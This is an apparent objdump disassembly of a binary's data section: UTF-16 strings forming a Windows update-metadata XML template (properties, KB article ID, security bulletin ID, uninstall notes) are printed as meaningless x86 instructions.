  4095bd:	3d 00 22 00 32       	cmp    $0x32002200,%eax
  4095c2:	00 30                	add    %dh,(%eax)
  4095c4:	00 34 00             	add    %dh,(%eax,%eax,1)
  4095c7:	22 00                	and    (%eax),%al
  4095c9:	20 00                	and    %al,(%eax)
  4095cb:	2f                   	das
  4095cc:	00 3e                	add    %bh,(%esi)
  4095ce:	00 00                	add    %al,(%eax)
  4095d0:	81 19 09 00 3c 00    	sbbl   $0x3c0009,(%ecx)
  4095d6:	75 00                	jne    0x4095d8
  4095d8:	70 00                	jo     0x4095da
  4095da:	64 00 3a             	add    %bh,%fs:(%edx)
  4095dd:	00 50 00             	add    %dl,0x0(%eax)
  4095e0:	72 00                	jb     0x4095e2
  4095e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4095e3:	00 70 00             	add    %dh,0x0(%eax)
  4095e6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4095ea:	74 00                	je     0x4095ec
  4095ec:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4095f2:	20 00                	and    %al,(%eax)
  4095f4:	44                   	inc    %esp
  4095f5:	00 65 00             	add    %ah,0x0(%ebp)
  4095f8:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4095fc:	75 00                	jne    0x4095fe
  4095fe:	6c                   	insb   (%dx),%es:(%edi)
  4095ff:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  409603:	00 72 00             	add    %dh,0x0(%edx)
  409606:	6f                   	outsl  %ds:(%esi),(%dx)
  409607:	00 70 00             	add    %dh,0x0(%eax)
  40960a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40960e:	74 00                	je     0x409610
  409610:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  409616:	4c                   	dec    %esp
  409617:	00 61 00             	add    %ah,0x0(%ecx)
  40961a:	6e                   	outsb  %ds:(%esi),(%dx)
  40961b:	00 67 00             	add    %ah,0x0(%edi)
  40961e:	75 00                	jne    0x409620
  409620:	61                   	popa
  409621:	00 67 00             	add    %ah,0x0(%edi)
  409624:	65 00 3d 00 22 00 65 	add    %bh,%gs:0x65002200
  40962b:	00 6e 00             	add    %ch,0x0(%esi)
  40962e:	22 00                	and    (%eax),%al
  409630:	20 00                	and    %al,(%eax)
  409632:	55                   	push   %ebp
  409633:	00 70 00             	add    %dh,0x0(%eax)
  409636:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40963a:	74 00                	je     0x40963c
  40963c:	65 00 54 00 79       	add    %dl,%gs:0x79(%eax,%eax,1)
  409641:	00 70 00             	add    %dh,0x0(%eax)
  409644:	65 00 3d 00 22 00 53 	add    %bh,%gs:0x53002200
  40964b:	00 6f 00             	add    %ch,0x0(%edi)
  40964e:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  409653:	00 61 00             	add    %ah,0x0(%ecx)
  409656:	72 00                	jb     0x409658
  409658:	65 00 22             	add    %ah,%gs:(%edx)
  40965b:	00 20                	add    %ah,(%eax)
  40965d:	00 45 00             	add    %al,0x0(%ebp)
  409660:	78 00                	js     0x409662
  409662:	70 00                	jo     0x409664
  409664:	6c                   	insb   (%dx),%es:(%edi)
  409665:	00 69 00             	add    %ch,0x0(%ecx)
  409668:	63 00                	arpl   %eax,(%eax)
  40966a:	69 00 74 00 6c 00    	imul   $0x6c0074,(%eax),%eax
  409670:	79 00                	jns    0x409672
  409672:	44                   	inc    %esp
  409673:	00 65 00             	add    %ah,0x0(%ebp)
  409676:	70 00                	jo     0x409678
  409678:	6c                   	insb   (%dx),%es:(%edi)
  409679:	00 6f 00             	add    %ch,0x0(%edi)
  40967c:	79 00                	jns    0x40967e
  40967e:	61                   	popa
  40967f:	00 62 00             	add    %ah,0x0(%edx)
  409682:	6c                   	insb   (%dx),%es:(%edi)
  409683:	00 65 00             	add    %ah,0x0(%ebp)
  409686:	3d 00 22 00 74       	cmp    $0x74002200,%eax
  40968b:	00 72 00             	add    %dh,0x0(%edx)
  40968e:	75 00                	jne    0x409690
  409690:	65 00 22             	add    %ah,%gs:(%edx)
  409693:	00 20                	add    %ah,(%eax)
  409695:	00 41 00             	add    %al,0x0(%ecx)
  409698:	75 00                	jne    0x40969a
  40969a:	74 00                	je     0x40969c
  40969c:	6f                   	outsl  %ds:(%esi),(%dx)
  40969d:	00 53 00             	add    %dl,0x0(%ebx)
  4096a0:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  4096a5:	00 63 00             	add    %ah,0x0(%ebx)
  4096a8:	74 00                	je     0x4096aa
  4096aa:	4f                   	dec    %edi
  4096ab:	00 6e 00             	add    %ch,0x0(%esi)
  4096ae:	57                   	push   %edi
  4096af:	00 65 00             	add    %ah,0x0(%ebp)
  4096b2:	62 00                	bound  %eax,(%eax)
  4096b4:	53                   	push   %ebx
  4096b5:	00 69 00             	add    %ch,0x0(%ecx)
  4096b8:	74 00                	je     0x4096ba
  4096ba:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4096be:	3d 00 22 00 74       	cmp    $0x74002200,%eax
  4096c3:	00 72 00             	add    %dh,0x0(%edx)
  4096c6:	75 00                	jne    0x4096c8
  4096c8:	65 00 22             	add    %ah,%gs:(%edx)
  4096cb:	00 20                	add    %ah,(%eax)
  4096cd:	00 4d 00             	add    %cl,0x0(%ebp)
  4096d0:	73 00                	jae    0x4096d2
  4096d2:	72 00                	jb     0x4096d4
  4096d4:	63 00                	arpl   %eax,(%eax)
  4096d6:	53                   	push   %ebx
  4096d7:	00 65 00             	add    %ah,0x0(%ebp)
  4096da:	76 00                	jbe    0x4096dc
  4096dc:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4096e0:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  4096e6:	3d 00 22 00 00       	cmp    $0x2200,%eax
  4096eb:	80 9b 22 00 20 00 49 	sbbb   $0x49,0x200022(%ebx)
  4096f2:	00 73 00             	add    %dh,0x0(%ebx)
  4096f5:	50                   	push   %eax
  4096f6:	00 75 00             	add    %dh,0x0(%ebp)
  4096f9:	62 00                	bound  %eax,(%eax)
  4096fb:	6c                   	insb   (%dx),%es:(%edi)
  4096fc:	00 69 00             	add    %ch,0x0(%ecx)
  4096ff:	63 00                	arpl   %eax,(%eax)
  409701:	3d 00 22 00 66       	cmp    $0x66002200,%eax
  409706:	00 61 00             	add    %ah,0x0(%ecx)
  409709:	6c                   	insb   (%dx),%es:(%edi)
  40970a:	00 73 00             	add    %dh,0x0(%ebx)
  40970d:	65 00 22             	add    %ah,%gs:(%edx)
  409710:	00 20                	add    %ah,(%eax)
  409712:	00 49 00             	add    %cl,0x0(%ecx)
  409715:	73 00                	jae    0x409717
  409717:	42                   	inc    %edx
  409718:	00 65 00             	add    %ah,0x0(%ebp)
  40971b:	74 00                	je     0x40971d
  40971d:	61                   	popa
  40971e:	00 3d 00 22 00 66    	add    %bh,0x66002200
  409724:	00 61 00             	add    %ah,0x0(%ecx)
  409727:	6c                   	insb   (%dx),%es:(%edi)
  409728:	00 73 00             	add    %dh,0x0(%ebx)
  40972b:	65 00 22             	add    %ah,%gs:(%edx)
  40972e:	00 20                	add    %ah,(%eax)
  409730:	00 50 00             	add    %dl,0x0(%eax)
  409733:	75 00                	jne    0x409735
  409735:	62 00                	bound  %eax,(%eax)
  409737:	6c                   	insb   (%dx),%es:(%edi)
  409738:	00 69 00             	add    %ch,0x0(%ecx)
  40973b:	63 00                	arpl   %eax,(%eax)
  40973d:	61                   	popa
  40973e:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409742:	00 6f 00             	add    %ch,0x0(%edi)
  409745:	6e                   	outsb  %ds:(%esi),(%dx)
  409746:	00 53 00             	add    %dl,0x0(%ebx)
  409749:	74 00                	je     0x40974b
  40974b:	61                   	popa
  40974c:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409750:	00 3d 00 22 00 50    	add    %bh,0x50002200
  409756:	00 75 00             	add    %dh,0x0(%ebp)
  409759:	62 00                	bound  %eax,(%eax)
  40975b:	6c                   	insb   (%dx),%es:(%edi)
  40975c:	00 69 00             	add    %ch,0x0(%ecx)
  40975f:	73 00                	jae    0x409761
  409761:	68 00 65 00 64       	push   $0x64006500
  409766:	00 22                	add    %ah,(%edx)
  409768:	00 20                	add    %ah,(%eax)
  40976a:	00 43 00             	add    %al,0x0(%ebx)
  40976d:	72 00                	jb     0x40976f
  40976f:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409773:	74 00                	je     0x409775
  409775:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40977b:	44                   	inc    %esp
  40977c:	00 61 00             	add    %ah,0x0(%ecx)
  40977f:	74 00                	je     0x409781
  409781:	65 00 3d 00 22 00 00 	add    %bh,%gs:0x2200
  409788:	80 83 22 00 20 00 50 	addb   $0x50,0x200022(%ebx)
  40978f:	00 75 00             	add    %dh,0x0(%ebp)
  409792:	62 00                	bound  %eax,(%eax)
  409794:	6c                   	insb   (%dx),%es:(%edi)
  409795:	00 69 00             	add    %ch,0x0(%ecx)
  409798:	73 00                	jae    0x40979a
  40979a:	68 00 65 00 72       	push   $0x72006500
  40979f:	00 49 00             	add    %cl,0x0(%ecx)
  4097a2:	44                   	inc    %esp
  4097a3:	00 3d 00 22 00 33    	add    %bh,0x33002200
  4097a9:	00 39                	add    %bh,(%ecx)
  4097ab:	00 35 00 33 00 39    	add    %dh,0x39003300
  4097b1:	00 32                	add    %dh,(%edx)
  4097b3:	00 61 00             	add    %ah,0x0(%ecx)
  4097b6:	30 00                	xor    %al,(%eax)
  4097b8:	2d 00 31 00 39       	sub    $0x39003100,%eax
  4097bd:	00 63 00             	add    %ah,0x0(%ebx)
  4097c0:	30 00                	xor    %al,(%eax)
  4097c2:	2d 00 34 00 38       	sub    $0x38003400,%eax
  4097c7:	00 62 00             	add    %ah,0x0(%edx)
  4097ca:	37                   	aaa
  4097cb:	00 2d 00 61 00 39    	add    %ch,0x39006100
  4097d1:	00 32                	add    %dh,(%edx)
  4097d3:	00 37                	add    %dh,(%edi)
  4097d5:	00 2d 00 66 00 37    	add    %ch,0x37006600
  4097db:	00 63 00             	add    %ah,0x0(%ebx)
  4097de:	31 00                	xor    %eax,(%eax)
  4097e0:	35 00 30 00 36       	xor    $0x36003000,%eax
  4097e5:	00 36                	add    %dh,(%esi)
  4097e7:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  4097eb:	00 30                	add    %dh,(%eax)
  4097ed:	00 35 00 22 00 20    	add    %dh,0x20002200
  4097f3:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  4097f7:	00 67 00             	add    %ah,0x0(%edi)
  4097fa:	61                   	popa
  4097fb:	00 63 00             	add    %ah,0x0(%ebx)
  4097fe:	79 00                	jns    0x409800
  409800:	4e                   	dec    %esi
  409801:	00 61 00             	add    %ah,0x0(%ecx)
  409804:	6d                   	insl   (%dx),%es:(%edi)
  409805:	00 65 00             	add    %ah,0x0(%ebp)
  409808:	3d 00 22 00 01       	cmp    $0x1002200,%eax
  40980d:	05 22 00 3e 00       	add    $0x3e0022,%eax
  409812:	00 25 09 00 09 00    	add    %ah,0x90009
  409818:	3c 00                	cmp    $0x0,%al
  40981a:	75 00                	jne    0x40981c
  40981c:	70 00                	jo     0x40981e
  40981e:	64 00 3a             	add    %bh,%fs:(%edx)
  409821:	00 53 00             	add    %dl,0x0(%ebx)
  409824:	75 00                	jne    0x409826
  409826:	70 00                	jo     0x409828
  409828:	70 00                	jo     0x40982a
  40982a:	6f                   	outsl  %ds:(%esi),(%dx)
  40982b:	00 72 00             	add    %dh,0x0(%edx)
  40982e:	74 00                	je     0x409830
  409830:	55                   	push   %ebp
  409831:	00 72 00             	add    %dh,0x0(%edx)
  409834:	6c                   	insb   (%dx),%es:(%edi)
  409835:	00 3e                	add    %bh,(%esi)
  409837:	00 00                	add    %al,(%eax)
  409839:	23 3c 00             	and    (%eax,%eax,1),%edi
  40983c:	2f                   	das
  40983d:	00 75 00             	add    %dh,0x0(%ebp)
  409840:	70 00                	jo     0x409842
  409842:	64 00 3a             	add    %bh,%fs:(%edx)
  409845:	00 53 00             	add    %dl,0x0(%ebx)
  409848:	75 00                	jne    0x40984a
  40984a:	70 00                	jo     0x40984c
  40984c:	70 00                	jo     0x40984e
  40984e:	6f                   	outsl  %ds:(%esi),(%dx)
  40984f:	00 72 00             	add    %dh,0x0(%edx)
  409852:	74 00                	je     0x409854
  409854:	55                   	push   %ebp
  409855:	00 72 00             	add    %dh,0x0(%edx)
  409858:	6c                   	insb   (%dx),%es:(%edi)
  409859:	00 3e                	add    %bh,(%esi)
  40985b:	00 00                	add    %al,(%eax)
  40985d:	35 09 00 09 00       	xor    $0x90009,%eax
  409862:	3c 00                	cmp    $0x0,%al
  409864:	75 00                	jne    0x409866
  409866:	70 00                	jo     0x409868
  409868:	64 00 3a             	add    %bh,%fs:(%edx)
  40986b:	00 53 00             	add    %dl,0x0(%ebx)
  40986e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409872:	75 00                	jne    0x409874
  409874:	72 00                	jb     0x409876
  409876:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40987c:	42                   	inc    %edx
  40987d:	00 75 00             	add    %dh,0x0(%ebp)
  409880:	6c                   	insb   (%dx),%es:(%edi)
  409881:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  409885:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409889:	00 6e 00             	add    %ch,0x0(%esi)
  40988c:	49                   	dec    %ecx
  40988d:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  409891:	00 00                	add    %al,(%eax)
  409893:	33 3c 00             	xor    (%eax,%eax,1),%edi
  409896:	2f                   	das
  409897:	00 75 00             	add    %dh,0x0(%ebp)
  40989a:	70 00                	jo     0x40989c
  40989c:	64 00 3a             	add    %bh,%fs:(%edx)
  40989f:	00 53 00             	add    %dl,0x0(%ebx)
  4098a2:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4098a6:	75 00                	jne    0x4098a8
  4098a8:	72 00                	jb     0x4098aa
  4098aa:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  4098b0:	42                   	inc    %edx
  4098b1:	00 75 00             	add    %dh,0x0(%ebp)
  4098b4:	6c                   	insb   (%dx),%es:(%edi)
  4098b5:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4098b9:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4098bd:	00 6e 00             	add    %ch,0x0(%esi)
  4098c0:	49                   	dec    %ecx
  4098c1:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  4098c5:	00 00                	add    %al,(%eax)
  4098c7:	27                   	daa
  4098c8:	09 00                	or     %eax,(%eax)
  4098ca:	09 00                	or     %eax,(%eax)
  4098cc:	3c 00                	cmp    $0x0,%al
  4098ce:	75 00                	jne    0x4098d0
  4098d0:	70 00                	jo     0x4098d2
  4098d2:	64 00 3a             	add    %bh,%fs:(%edx)
  4098d5:	00 4b 00             	add    %cl,0x0(%ebx)
  4098d8:	42                   	inc    %edx
  4098d9:	00 41 00             	add    %al,0x0(%ecx)
  4098dc:	72 00                	jb     0x4098de
  4098de:	74 00                	je     0x4098e0
  4098e0:	69 00 63 00 6c 00    	imul   $0x6c0063,(%eax),%eax
  4098e6:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4098ea:	44                   	inc    %esp
  4098eb:	00 3e                	add    %bh,(%esi)
  4098ed:	00 00                	add    %al,(%eax)
  4098ef:	25 3c 00 2f 00       	and    $0x2f003c,%eax
  4098f4:	75 00                	jne    0x4098f6
  4098f6:	70 00                	jo     0x4098f8
  4098f8:	64 00 3a             	add    %bh,%fs:(%edx)
  4098fb:	00 4b 00             	add    %cl,0x0(%ebx)
  4098fe:	42                   	inc    %edx
  4098ff:	00 41 00             	add    %al,0x0(%ecx)
  409902:	72 00                	jb     0x409904
  409904:	74 00                	je     0x409906
  409906:	69 00 63 00 6c 00    	imul   $0x6c0063,(%eax),%eax
  40990c:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409910:	44                   	inc    %esp
  409911:	00 3e                	add    %bh,(%esi)
  409913:	00 00                	add    %al,(%eax)
  409915:	1d 09 00 09 00       	sbb    $0x90009,%eax
  40991a:	09 00                	or     %eax,(%eax)
  40991c:	3c 00                	cmp    $0x0,%al
  40991e:	75 00                	jne    0x409920
  409920:	70 00                	jo     0x409922
  409922:	64 00 3a             	add    %bh,%fs:(%edx)
  409925:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  409929:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40992d:	00 65 00             	add    %ah,0x0(%ebp)
  409930:	3e 00 00             	add    %al,%ds:(%eax)
  409933:	19 3c 00             	sbb    %edi,(%eax,%eax,1)
  409936:	2f                   	das
  409937:	00 75 00             	add    %dh,0x0(%ebp)
  40993a:	70 00                	jo     0x40993c
  40993c:	64 00 3a             	add    %bh,%fs:(%edx)
  40993f:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  409943:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  409947:	00 65 00             	add    %ah,0x0(%ebp)
  40994a:	3e 00 00             	add    %al,%ds:(%eax)
  40994d:	29 09                	sub    %ecx,(%ecx)
  40994f:	00 09                	add    %cl,(%ecx)
  409951:	00 09                	add    %cl,(%ecx)
  409953:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409956:	75 00                	jne    0x409958
  409958:	70 00                	jo     0x40995a
  40995a:	64 00 3a             	add    %bh,%fs:(%edx)
  40995d:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  409961:	00 73 00             	add    %dh,0x0(%ebx)
  409964:	63 00                	arpl   %eax,(%eax)
  409966:	72 00                	jb     0x409968
  409968:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40996e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409974:	3e 00 00             	add    %al,%ds:(%eax)
  409977:	25 3c 00 2f 00       	and    $0x2f003c,%eax
  40997c:	75 00                	jne    0x40997e
  40997e:	70 00                	jo     0x409980
  409980:	64 00 3a             	add    %bh,%fs:(%edx)
  409983:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  409987:	00 73 00             	add    %dh,0x0(%ebx)
  40998a:	63 00                	arpl   %eax,(%eax)
  40998c:	72 00                	jb     0x40998e
  40998e:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409994:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40999a:	3e 00 00             	add    %al,%ds:(%eax)
  40999d:	81 3f 09 00 09 00    	cmpl   $0x90009,(%edi)
  4099a3:	09 00                	or     %eax,(%eax)
  4099a5:	3c 00                	cmp    $0x0,%al
  4099a7:	75 00                	jne    0x4099a9
  4099a9:	70 00                	jo     0x4099ab
  4099ab:	64 00 3a             	add    %bh,%fs:(%edx)
  4099ae:	00 55 00             	add    %dl,0x0(%ebp)
  4099b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b2:	00 69 00             	add    %ch,0x0(%ecx)
  4099b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b6:	00 73 00             	add    %dh,0x0(%ebx)
  4099b9:	74 00                	je     0x4099bb
  4099bb:	61                   	popa
  4099bc:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4099c0:	00 4e 00             	add    %cl,0x0(%esi)
  4099c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4099c4:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4099c8:	00 73 00             	add    %dh,0x0(%ebx)
  4099cb:	3e 00 54 00 68       	add    %dl,%ds:0x68(%eax,%eax,1)
  4099d0:	00 69 00             	add    %ch,0x0(%ecx)
  4099d3:	73 00                	jae    0x4099d5
  4099d5:	20 00                	and    %al,(%eax)
  4099d7:	73 00                	jae    0x4099d9
  4099d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4099da:	00 66 00             	add    %ah,0x0(%esi)
  4099dd:	74 00                	je     0x4099df
  4099df:	77 00                	ja     0x4099e1
  4099e1:	61                   	popa
  4099e2:	00 72 00             	add    %dh,0x0(%edx)
  4099e5:	65 00 20             	add    %ah,%gs:(%eax)
  4099e8:	00 75 00             	add    %dh,0x0(%ebp)
  4099eb:	70 00                	jo     0x4099ed
  4099ed:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4099f1:	74 00                	je     0x4099f3
  4099f3:	65 00 20             	add    %ah,%gs:(%eax)
  4099f6:	00 63 00             	add    %ah,0x0(%ebx)
  4099f9:	61                   	popa
  4099fa:	00 6e 00             	add    %ch,0x0(%esi)
  4099fd:	20 00                	and    %al,(%eax)
  4099ff:	62 00                	bound  %eax,(%eax)
  409a01:	65 00 20             	add    %ah,%gs:(%eax)
  409a04:	00 72 00             	add    %dh,0x0(%edx)
  409a07:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409a0b:	6f                   	outsl  %ds:(%esi),(%dx)
  409a0c:	00 76 00             	add    %dh,0x0(%esi)
  409a0f:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  409a14:	00 62 00             	add    %ah,0x0(%edx)
  409a17:	79 00                	jns    0x409a19
  409a19:	20 00                	and    %al,(%eax)
  409a1b:	73 00                	jae    0x409a1d
  409a1d:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  409a22:	00 63 00             	add    %ah,0x0(%ebx)
  409a25:	74 00                	je     0x409a27
  409a27:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409a2d:	20 00                	and    %al,(%eax)
  409a2f:	56                   	push   %esi
  409a30:	00 69 00             	add    %ch,0x0(%ecx)
  409a33:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  409a37:	20 00                	and    %al,(%eax)
  409a39:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  409a3f:	74 00                	je     0x409a41
  409a41:	61                   	popa
  409a42:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409a46:	00 65 00             	add    %ah,0x0(%ebp)
  409a49:	64 00 20             	add    %ah,%fs:(%eax)
  409a4c:	00 75 00             	add    %dh,0x0(%ebp)
  409a4f:	70 00                	jo     0x409a51
  409a51:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409a55:	74 00                	je     0x409a57
  409a57:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409a5b:	20 00                	and    %al,(%eax)
  409a5d:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  409a63:	74 00                	je     0x409a65
  409a65:	68 00 65 00 20       	push   $0x20006500
  409a6a:	00 50 00             	add    %dl,0x0(%eax)
  409a6d:	72 00                	jb     0x409a6f
  409a6f:	6f                   	outsl  %ds:(%esi),(%dx)
  409a70:	00 67 00             	add    %ah,0x0(%edi)
  409a73:	72 00                	jb     0x409a75
  409a75:	61                   	popa
  409a76:	00 6d 00             	add    %ch,0x0(%ebp)
  409a79:	73 00                	jae    0x409a7b
  409a7b:	20 00                	and    %al,(%eax)
  409a7d:	61                   	popa
  409a7e:	00 6e 00             	add    %ch,0x0(%esi)
  409a81:	64 00 20             	add    %ah,%fs:(%eax)
  409a84:	00 46 00             	add    %al,0x0(%esi)
  409a87:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409a8b:	74 00                	je     0x409a8d
  409a8d:	75 00                	jne    0x409a8f
  409a8f:	72 00                	jb     0x409a91
  409a91:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409a95:	20 00                	and    %al,(%eax)
  409a97:	43                   	inc    %ebx
  409a98:	00 6f 00             	add    %ch,0x0(%edi)
  409a9b:	6e                   	outsb  %ds:(%esi),(%dx)
  409a9c:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  409aa0:	00 6f 00             	add    %ch,0x0(%edi)
  409aa3:	6c                   	insb   (%dx),%es:(%edi)
  409aa4:	00 20                	add    %ah,(%eax)
  409aa6:	00 50 00             	add    %dl,0x0(%eax)
  409aa9:	61                   	popa
  409aaa:	00 6e 00             	add    %ch,0x0(%esi)
  409aad:	65 00 6c 00 2e       	add    %ch,%gs:0x2e(%eax,%eax,1)
  409ab2:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409ab5:	2f                   	das
  409ab6:	00 75 00             	add    %dh,0x0(%ebp)
  409ab9:	70 00                	jo     0x409abb
  409abb:	64 00 3a             	add    %bh,%fs:(%edx)
  409abe:	00 55 00             	add    %dl,0x0(%ebp)
  409ac1:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac2:	00 69 00             	add    %ch,0x0(%ecx)
  409ac5:	6e                   	outsb  %ds:(%esi),(%dx)
  409ac6:	00 73 00             	add    %dh,0x0(%ebx)
  409ac9:	74 00                	je     0x409acb
  409acb:	61                   	popa
  409acc:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409ad0:	00 4e 00             	add    %cl,0x0(%esi)
  409ad3:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad4:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409ad8:	00 73 00             	add    %dh,0x0(%ebx)
  409adb:	3e 00 00             	add    %al,%ds:(%eax)
  409ade:	29 09                	sub    %ecx,(%ecx)
  409ae0:	00 09                	add    %cl,(%ecx)
  409ae2:	00 09                	add    %cl,(%ecx)
  409ae4:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409ae7:	75 00                	jne    0x409ae9
  409ae9:	70 00                	jo     0x409aeb
  409aeb:	64 00 3a             	add    %bh,%fs:(%edx)
  409aee:	00 4d 00             	add    %cl,0x0(%ebp)
  409af1:	6f                   	outsl  %ds:(%esi),(%dx)
  409af2:	00 72 00             	add    %dh,0x0(%edx)
  409af5:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409af9:	6e                   	outsb  %ds:(%esi),(%dx)
  409afa:	00 66 00             	add    %ah,0x0(%esi)
  409afd:	6f                   	outsl  %ds:(%esi),(%dx)
  409afe:	00 55 00             	add    %dl,0x0(%ebp)
  409b01:	72 00                	jb     0x409b03
  409b03:	6c                   	insb   (%dx),%es:(%edi)
  409b04:	00 3e                	add    %bh,(%esi)
  409b06:	00 00                	add    %al,(%eax)
  409b08:	25 3c 00 2f 00       	and    $0x2f003c,%eax
  409b0d:	75 00                	jne    0x409b0f
  409b0f:	70 00                	jo     0x409b11
  409b11:	64 00 3a             	add    %bh,%fs:(%edx)
  409b14:	00 4d 00             	add    %cl,0x0(%ebp)
  409b17:	6f                   	outsl  %ds:(%esi),(%dx)
  409b18:	00 72 00             	add    %dh,0x0(%edx)
  409b1b:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409b1f:	6e                   	outsb  %ds:(%esi),(%dx)
  409b20:	00 66 00             	add    %ah,0x0(%esi)
  409b23:	6f                   	outsl  %ds:(%esi),(%dx)
  409b24:	00 55 00             	add    %dl,0x0(%ebp)
  409b27:	72 00                	jb     0x409b29
  409b29:	6c                   	insb   (%dx),%es:(%edi)
  409b2a:	00 3e                	add    %bh,(%esi)
  409b2c:	00 00                	add    %al,(%eax)
  409b2e:	27                   	daa
  409b2f:	09 00                	or     %eax,(%eax)
  409b31:	09 00                	or     %eax,(%eax)
  409b33:	09 00                	or     %eax,(%eax)
  409b35:	3c 00                	cmp    $0x0,%al
  409b37:	75 00                	jne    0x409b39
  409b39:	70 00                	jo     0x409b3b
  409b3b:	64 00 3a             	add    %bh,%fs:(%edx)
  409b3e:	00 53 00             	add    %dl,0x0(%ebx)
  409b41:	75 00                	jne    0x409b43
  409b43:	70 00                	jo     0x409b45
  409b45:	70 00                	jo     0x409b47
  409b47:	6f                   	outsl  %ds:(%esi),(%dx)
  409b48:	00 72 00             	add    %dh,0x0(%edx)
  409b4b:	74 00                	je     0x409b4d
  409b4d:	55                   	push   %ebp
  409b4e:	00 72 00             	add    %dh,0x0(%edx)
  409b51:	6c                   	insb   (%dx),%es:(%edi)
  409b52:	00 3e                	add    %bh,(%esi)
  409b54:	00 00                	add    %al,(%eax)
  409b56:	29 09                	sub    %ecx,(%ecx)
  409b58:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409b5b:	75 00                	jne    0x409b5d
  409b5d:	70 00                	jo     0x409b5f
  409b5f:	64 00 3a             	add    %bh,%fs:(%edx)
  409b62:	00 52 00             	add    %dl,0x0(%edx)
  409b65:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  409b6a:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409b6e:	00 6f 00             	add    %ch,0x0(%edi)
  409b71:	6e                   	outsb  %ds:(%esi),(%dx)
  409b72:	00 73 00             	add    %dh,0x0(%ebx)
  409b75:	68 00 69 00 70       	push   $0x70006900
  409b7a:	00 73 00             	add    %dh,0x0(%ebx)
  409b7d:	3e 00 00             	add    %al,%ds:(%eax)
  409b80:	2b 09                	sub    (%ecx),%ecx
  409b82:	00 09                	add    %cl,(%ecx)
  409b84:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409b87:	75 00                	jne    0x409b89
  409b89:	70 00                	jo     0x409b8b
  409b8b:	64 00 3a             	add    %bh,%fs:(%edx)
  409b8e:	00 50 00             	add    %dl,0x0(%eax)
  409b91:	72 00                	jb     0x409b93
  409b93:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409b97:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  409b9b:	75 00                	jne    0x409b9d
  409b9d:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  409ba3:	74 00                	je     0x409ba5
